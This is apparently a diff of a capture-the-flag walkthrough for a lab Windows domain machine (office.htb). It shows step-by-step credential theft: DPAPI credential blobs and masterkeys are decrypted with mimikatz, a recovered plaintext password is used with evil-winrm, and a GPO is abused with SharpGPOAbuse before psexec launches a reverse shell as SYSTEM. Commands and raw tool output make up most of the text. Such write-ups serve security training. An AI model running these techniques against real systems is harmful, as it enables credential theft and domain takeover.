@@ -448,7 +448,6 @@ now wait and we get the ppotts shell
 after that we need to check the existing users with credentials:
 
 vaultcmd /listcreds:"Windows Credentials" /all
-vaultcmd /listcreds:"Windows Credentials" /all
 Credentials in vault: Windows Credentials
 
 Credential schema: Windows Domain Password Credential
@@ -459,15 +458,19 @@ Roaming: No
 Property (schema element id,value): (100,3)
 
 now we need to exit to meterpreter shell and use:
-dir "%appdata%/Microsoft/Credentials"
+dir "%appdata%/Microsoft/Credentials" /A 
 
 and we get some encryted files:
 
-Mode              Size  Type  Last modified              Name
-----              ----  ----  -------------              ----
-100666/rw-rw-rw-  358   fil   2023-05-09 17:08:54 -0400  18A1927A997A794B65E9849883AC3F3E
-100666/rw-rw-rw-  398   fil   2023-05-09 19:03:21 -0400  84F1CAEEBF466550F4967858F9353FB4
-100666/rw-rw-rw-  374   fil   2024-01-18 14:53:30 -0500  E76CCA3670CD9BB98DF79E0A8D176F1E
+ Directory of C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials
+
+05/09/2023  04:14 PM    <DIR>          .
+01/18/2024  10:34 AM    <DIR>          ..
+05/09/2023  02:08 PM               358 18A1927A997A794B65E9849883AC3F3E
+05/09/2023  04:03 PM               398 84F1CAEEBF466550F4967858F9353FB4
+01/18/2024  12:53 PM               374 E76CCA3670CD9BB98DF79E0A8D176F1E
+
+
 
 to decrypt it,we gonna need mimikatz
 
@@ -477,4 +480,345 @@ uploading the mimikatz
 
 launching it with 
 
-dpapi::cred /in:"%appdata\microsoft\credentials\18A1927A997A794B65E9849883AC3F3E"
+dpapi::cred /in:"%appdata%\microsoft\credentials\18A1927A997A794B65E9849883AC3F3E"
+
+**BLOB**
+  dwVersion          : 00000001 - 1
+  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
+  dwMasterKeyVersion : 00000001 - 1
+  guidMasterKey      : {191d3f9d-7959-4b4d-a520-a444853c47eb}
+  dwFlags            : 20000000 - 536870912 (system ; )
+  dwDescriptionLen   : 0000003a - 58
+  szDescription      : Enterprise Credential Data
+
+  algCrypt           : 00006603 - 26115 (CALG_3DES)
+  dwAlgCryptLen      : 000000c0 - 192
+  dwSaltLen          : 00000010 - 16
+  pbSalt             : 88fdf043461d4913a49680c2cf45e8e6
+  dwHmacKeyLen       : 00000000 - 0
+  pbHmackKey         : 
+  algHash            : 00008004 - 32772 (CALG_SHA1)
+  dwAlgHashLen       : 000000a0 - 160
+  dwHmac2KeyLen      : 00000010 - 16
+  pbHmack2Key        : b68952824efb5374f396ef024b7f4f56
+  dwDataLen          : 00000098 - 152
+  pbData             : 0c1483543655e1eee285cb5244a83b72932723e88f937112d54896b19569be22aeda49f9aec91131dab8edae525506e7aa4861c98d67768350051ae93d9c493596d3e506fae0b6e885acd9d2a2837095d7da3f60d80288f4f8b8800171f26639df136e45eb399341ab216c81cf753aecc5342b6b212d85a46be1e2b45f6fcebd140755ec9d328c6d66a7bab635346de54fee236a63d20507
+  dwSignLen          : 00000014 - 20
+  pbSign             : 3a5e83bb958d713bfae523404a4de188a0319830
+
+
+**BLOB**
+  dwVersion          : 00000001 - 1
+  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
+  dwMasterKeyVersion : 00000001 - 1
+  guidMasterKey      : {191d3f9d-7959-4b4d-a520-a444853c47eb}
+  dwFlags            : 20000000 - 536870912 (system ; )
+  dwDescriptionLen   : 0000003a - 58
+  szDescription      : Enterprise Credential Data
+
+  algCrypt           : 00006603 - 26115 (CALG_3DES)
+  dwAlgCryptLen      : 000000c0 - 192
+  dwSaltLen          : 00000010 - 16
+  pbSalt             : 649c4466d5d647dd2c595f4e43fb7e1d
+  dwHmacKeyLen       : 00000000 - 0
+  pbHmackKey         : 
+  algHash            : 00008004 - 32772 (CALG_SHA1)
+  dwAlgHashLen       : 000000a0 - 160
+  dwHmac2KeyLen      : 00000010 - 16
+  pbHmack2Key        : 32e88dfd1927fdef0ede5abf2c024e3a
+  dwDataLen          : 000000c0 - 192
+  pbData             : f73b168ecbad599e5ca202cf9ff719ace31cc92423a28aff5838d7063de5cccd4ca86bfb2950391284b26a34b0eff2dbc9799bdd726df9fad9cb284bacd7f1ccbba0fe140ac16264896a810e80cac3b68f82c80347c4deaf682c2f4d3be1de025f0a68988fa9d633de943f7b809f35a141149ac748bb415990fb6ea95ef49bd561eb39358d1092aef3bbcc7d5f5f20bab8d3e395350c711d39dbe7c29d49a5328975aa6fd5267b39cf22ed1f9b933e2b8145d66a5a370dcf76de2acdf549fc97
+  dwSignLen          : 00000014 - 20
+  pbSign             : 21bfb22ca38e0a802e38065458cecef00b450976
+
+
+**BLOB**
+  dwVersion          : 00000001 - 1
+  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
+  dwMasterKeyVersion : 00000001 - 1
+  guidMasterKey      : {10811601-0fa9-43c2-97e5-9bef8471fc7d}
+  dwFlags            : 20000000 - 536870912 (system ; )
+  dwDescriptionLen   : 0000003a - 58
+  szDescription      : Enterprise Credential Data
+
+  algCrypt           : 00006603 - 26115 (CALG_3DES)
+  dwAlgCryptLen      : 000000c0 - 192
+  dwSaltLen          : 00000010 - 16
+  pbSalt             : 98d5fae89fd2aa297e5b56fff50a935d
+  dwHmacKeyLen       : 00000000 - 0
+  pbHmackKey         : 
+  algHash            : 00008004 - 32772 (CALG_SHA1)
+  dwAlgHashLen       : 000000a0 - 160
+  dwHmac2KeyLen      : 00000010 - 16
+  pbHmack2Key        : 1e6765360d9bbfd511bc5c30e366485d
+  dwDataLen          : 000000a8 - 168
+  pbData             : b3fe8d6e16f600055f65332874a6a6f1cc9b256edd22812ab615cd680096a34d5ba1baae7a2522beac4a0fd9e2f2af69796a3dba0afba53d87ebc1d779764ae59cb6bc076400e3481cb922032a6b8398c2f76e62ecaf59bd625bef5692ff14f8fd62b6daf2f9576d7bdf36922663452d8f694f78c6e61b23e0f5f37470d8109812e7de03a08264cfbcfb4c489cf4867acf609b6f9297489a1975004723ddb51c9bd1a162255144b3
+  dwSignLen          : 00000014 - 20
+  pbSign             : 61c53169de0f977282c18917d1bb630d67f3cb33
+
+we need guidMasterKey of those :
+
+{191d3f9d-7959-4b4d-a520-a444853c47eb}
+{10811601-0fa9-43c2-97e5-9bef8471fc7d}
+
+two of them are the same 
+
+now we need to find a masterkey in protect folder:
+
+%appdata%\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107
+
+lets look at the masterkeys using mimikatz
+
+now trying to look at the keys in mimikatz using:
+
+    dpapi::masterkey /in:"appdata%\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb"
+   **MASTERKEYS**
+  dwVersion          : 00000002 - 2
+  szGuid             : {191d3f9d-7959-4b4d-a520-a444853c47eb}
+  dwFlags            : 00000000 - 0
+  dwMasterKeyLen     : 00000088 - 136
+  dwBackupKeyLen     : 00000068 - 104
+  dwCredHistLen      : 00000000 - 0
+  dwDomainKeyLen     : 00000174 - 372
+[masterkey]
+  **MASTERKEY**
+    dwVersion        : 00000002 - 2
+    salt             : c521daa0857ee4fa6e4246266081e94c
+    rounds           : 00004650 - 18000
+    algHash          : 00008009 - 32777 (CALG_HMAC)
+    algCrypt         : 00006603 - 26115 (CALG_3DES)
+    pbKey            : 1107e1ab3e107528a73a2dafc0a2db28de1ea0a07e92cff03a935635013435d75e41797f612903d6eea41a8fc4f7ebe8d2fbecb0c74cdebb1e7df3c692682a066faa3edf107792d116584625cc97f0094384a5be811e9d5ce84e5f032704330609171c973008d84f
+
+[backupkey]
+  **MASTERKEY**
+    dwVersion        : 00000002 - 2
+    salt             : a2741b13d7261697be4241ebbe05098a
+    rounds           : 00004650 - 18000
+    algHash          : 00008009 - 32777 (CALG_HMAC)
+    algCrypt         : 00006603 - 26115 (CALG_3DES)
+    pbKey            : 21bf24763fbb1400010c08fccc5423fe7da8190c61d3006f2d5efd5ea586f463116805692bae637b2ab548828b3afb9313edc715edd11dc21143f4ce91f4f67afe987005320d3209
+
+[domainkey]
+  **DOMAINKEY**
+    dwVersion        : 00000002 - 2
+    dwSecretLen      : 00000100 - 256
+    dwAccesscheckLen : 00000058 - 88
+    guidMasterKey    : {e523832a-e126-4d6e-ac04-ed10da72b32f}
+    pbSecret         : 159613bdc2d90dd4834a37e29873ce04c74722a706d0ba4770865039b3520ff46cf9c9281542665df2e72db48f67e16e2014e07b88f8b2f7d376a8b9d47041768d650c20661aee31dc340aead98b7600662d2dc320b4f89cf7384c2a47809c024adf0694048c38d6e1e3e10e8bd7baa7a6f1214cd3a029f8372225b2df9754c19e2ae4bc5ff4b85755b4c2dfc89add9f73c54ac45a221e5a72d3efe491aa6da8fb0104a983be20af3280ae68783e8648df413d082fa7d25506e9e6de1aadbf9cf93ec8dfc5fab4bfe1dd1492dbb679b1fa25c3f15fb8500c6021f518c74e42cd4b5d5d6e1057f912db5479ebda56892f346b4e9bf6404906c7cd65a54eea2842
+    pbAccesscheck    : 1430b9a3c4ab2e9d5f61dd6c62aab8e1742338623f08461fe991cccd5b3e4621d4c8e322650460181967c409c20efcf02e8936c007f7a506566d66ba57448aa8c3524f0b9cf881afcbb80c9d8c341026f3d45382f63f8665
+
+
+Auto SID from path seems to be: S-1-5-21-1199398058-4196589450-691661856-1107
+
+
+mimikatz # dpapi::masterkey /in:"%appdata%\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107\10811601-0fa9-43c2-97e5-9bef8471fc7d"
+**MASTERKEYS**
+  dwVersion          : 00000002 - 2
+  szGuid             : {10811601-0fa9-43c2-97e5-9bef8471fc7d}
+  dwFlags            : 00000000 - 0
+  dwMasterKeyLen     : 00000088 - 136
+  dwBackupKeyLen     : 00000068 - 104
+  dwCredHistLen      : 00000000 - 0
+  dwDomainKeyLen     : 00000174 - 372
+[masterkey]
+  **MASTERKEY**
+    dwVersion        : 00000002 - 2
+    salt             : 8bc9f4a7b9094394e57e92daedeafcb9
+    rounds           : 00004650 - 18000
+    algHash          : 00008009 - 32777 (CALG_HMAC)
+    algCrypt         : 00006603 - 26115 (CALG_3DES)
+    pbKey            : f97146093504382ec842cd2eec5f2bbfbbdd83ab6c4e44ada82d5ae23d1a05422fe6d1378165d4434bf41737616acf823e86c69424271d0f72684018a0928045ef77b719003b352644398f4286795b1297bee821deec898cb167aa76d984808014aa0d22136688c3
+
+[backupkey]
+  **MASTERKEY**
+    dwVersion        : 00000002 - 2
+    salt             : 26773bc8263172355939bdb9cb33e2f9
+    rounds           : 00004650 - 18000
+    algHash          : 00008009 - 32777 (CALG_HMAC)
+    algCrypt         : 00006603 - 26115 (CALG_3DES)
+    pbKey            : 540c745f74ac62c43d245e850eb9952d6daf6a803163b94683eb82a30bf3d20d8e72d4e1003e0f17ca2575722c009e1855333ddacb7f08702369b0035aff50163eee5d2f2384fe28
+
+[domainkey]
+  **DOMAINKEY**
+    dwVersion        : 00000002 - 2
+    dwSecretLen      : 00000100 - 256
+    dwAccesscheckLen : 00000058 - 88
+    guidMasterKey    : {e523832a-e126-4d6e-ac04-ed10da72b32f}
+    pbSecret         : dda74feddaea0b4119723acb88bb3aa033b85d6fd6451d04d0afa95d00c640d33d83f0894c5c62fd6298327c40773512ccad8961131005b450732f72bc3ece29defa2088def5dce8f64ff76641057d473ad0073688c39c491286461b57a38eddbde92f213811ba2ec0f7867cd377df0b860584e3fc082529e7adaa437ebb3ac8c39a567df96bf21ce21bfb7c687b613b678a8be14f1fc6e96c9a16a18c156bc0255e514cfd61eb4d81fa08060c6cd35d330f5a0121ca7126ba667ccb1fbb2f93857f8230e20606b7b69d558b9462012db6e6418acd86d1b9a671d94ff92e5fd3684b099f5a29165a3410ddb9e924b4b31f22428895f37815badf7ec30fe80884
+    pbAccesscheck    : a98be73386a3dca744e20b13b967e3bc4a1f58bf9be981bf84cf2e2c4daab8ca4def27d6e22540e7eebadd6c122ed75a1b991532d88794e2e999673385241275fe2735bbbb46f9e88dbd799589b42d572ca6b14ecf279a6d
+
+
+Auto SID from path seems to be: S-1-5-21-1199398058-4196589450-691661856-1107
+
+
+but still we dont see any credentials
+
+lets use /rpc because we are not domain admin
+
+and we get the additional section with it:
+
+[domainkey] with RPC
+[DC] 'office.htb' will be the domain
+[DC] 'DC.office.htb' will be the DC server
+  key : 3f891c81971ccacb02123a9dde170eaae918026ccc0a305b221d3582de4add84c900ae79f950132e4a70b0ef49dea6907b4f319c5dd10f60cc31cb1e3bc33024
+  sha1: fbab11cacdd8407e8db9604f0f8c92178bee6fd3
+
+
+[domainkey] with RPC
+[DC] 'office.htb' will be the domain
+[DC] 'DC.office.htb' will be the DC server
+  key : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
+  sha1: 85285eb368befb1670633b05ce58ca4d75c73c77
+
+using dpapi::cache
+
+CREDENTIALS cache
+=================
+
+MASTERKEYS cache
+================
+GUID:{10811601-0fa9-43c2-97e5-9bef8471fc7d};KeyHash:fbab11cacdd8407e8db9604f0f8c92178bee6fd3
+GUID:{191d3f9d-7959-4b4d-a520-a444853c47eb};KeyHash:85285eb368befb1670633b05ce58ca4d75c73c77
+
+DOMAINKEYS cache
+
+
+now we can try to decrypt it with 
+dpapi::cred /in:"%appdata%\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4"
+
+**BLOB**
+  dwVersion          : 00000001 - 1
+  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
+  dwMasterKeyVersion : 00000001 - 1
+  guidMasterKey      : {191d3f9d-7959-4b4d-a520-a444853c47eb}
+  dwFlags            : 20000000 - 536870912 (system ; )
+  dwDescriptionLen   : 0000003a - 58
+  szDescription      : Enterprise Credential Data
+
+  algCrypt           : 00006603 - 26115 (CALG_3DES)
+  dwAlgCryptLen      : 000000c0 - 192
+  dwSaltLen          : 00000010 - 16
+  pbSalt             : 649c4466d5d647dd2c595f4e43fb7e1d
+  dwHmacKeyLen       : 00000000 - 0
+  pbHmackKey         : 
+  algHash            : 00008004 - 32772 (CALG_SHA1)
+  dwAlgHashLen       : 000000a0 - 160
+  dwHmac2KeyLen      : 00000010 - 16
+  pbHmack2Key        : 32e88dfd1927fdef0ede5abf2c024e3a
+  dwDataLen          : 000000c0 - 192
+  pbData             : f73b168ecbad599e5ca202cf9ff719ace31cc92423a28aff5838d7063de5cccd4ca86bfb2950391284b26a34b0eff2dbc9799bdd726df9fad9cb284bacd7f1ccbba0fe140ac16264896a810e80cac3b68f82c80347c4deaf682c2f4d3be1de025f0a68988fa9d633de943f7b809f35a141149ac748bb415990fb6ea95ef49bd561eb39358d1092aef3bbcc7d5f5f20bab8d3e395350c711d39dbe7c29d49a5328975aa6fd5267b39cf22ed1f9b933e2b8145d66a5a370dcf76de2acdf549fc97
+  dwSignLen          : 00000014 - 20
+  pbSign             : 21bfb22ca38e0a802e38065458cecef00b450976
+
+Decrypting Credential:
+ * volatile cache: GUID:{191d3f9d-7959-4b4d-a520-a444853c47eb};KeyHash:85285eb368befb1670633b05ce58ca4d75c73c77
+**CREDENTIAL**
+  credFlags      : 00000030 - 48
+  credSize       : 000000be - 190
+  credUnk0       : 00000000 - 0
+
+  Type           : 00000002 - 2 - domain_password
+  Flags          : 00000000 - 0
+  LastWritten    : 5/9/2023 11:03:21 PM
+  unkFlagsOrSize : 00000018 - 24
+  Persist        : 00000003 - 3 - enterprise
+  AttributeCount : 00000000 - 0
+  unk0           : 00000000 - 0
+  unk1           : 00000000 - 0
+  TargetName     : Domain:interactive=OFFICE\HHogan
+  UnkData        : (null)
+  Comment        : (null)
+  TargetAlias    : (null)
+  UserName       : OFFICE\HHogan
+  CredentialBlob : H4ppyFtW183#
+  Attributes     : 0
+
+and we get the HHogan creds
+
+now we can use evil-winrm 
+
+evil-winrm -i office.htb -u HHogan -p H4ppyFtW183#
+
+and we are hhogan
+
+C:\Users\HHogan\Documents> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+C:\Users\HHogan\Documents> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name     SID
+============= =============================================
+office\hhogan S-1-5-21-1199398058-4196589450-691661856-1108
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                           Attributes
+=========================================== ================ ============================================= ==================================================
+Everyone                                    Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+OFFICE\GPO Managers                         Group            S-1-5-21-1199398058-4196589450-691661856-1117 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+
+looks like im in GPO Manager Group
+
+we need to upload another reverse shell, psexec and SharpGPOAbuse
+
+\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount HHOGAN --GPOName "DEFAULT DOMAIN POLICY"
+
+afert this we need to wait until we see using net user hhogan that the user be added as:
+
+Local Group Memberships      *Administrators       *Remote Management Use
+Global Group memberships     *Domain Users         *GPO Managers
+The command completed successfully.
+
+
+
+after we get this,we need to exit and reconnet the evil-winrm 
+
+than we need to use very quickly:
+
+.\psexec.exe -accepteula -s -i C:\users\hhogan\desktop\r49.exe
+
+at the reverse shell console we need to get a reverse shell as nt AUTHORITY
+
+and we get the root flag:
+
+14765fba89a362b2337a1efbe932d310
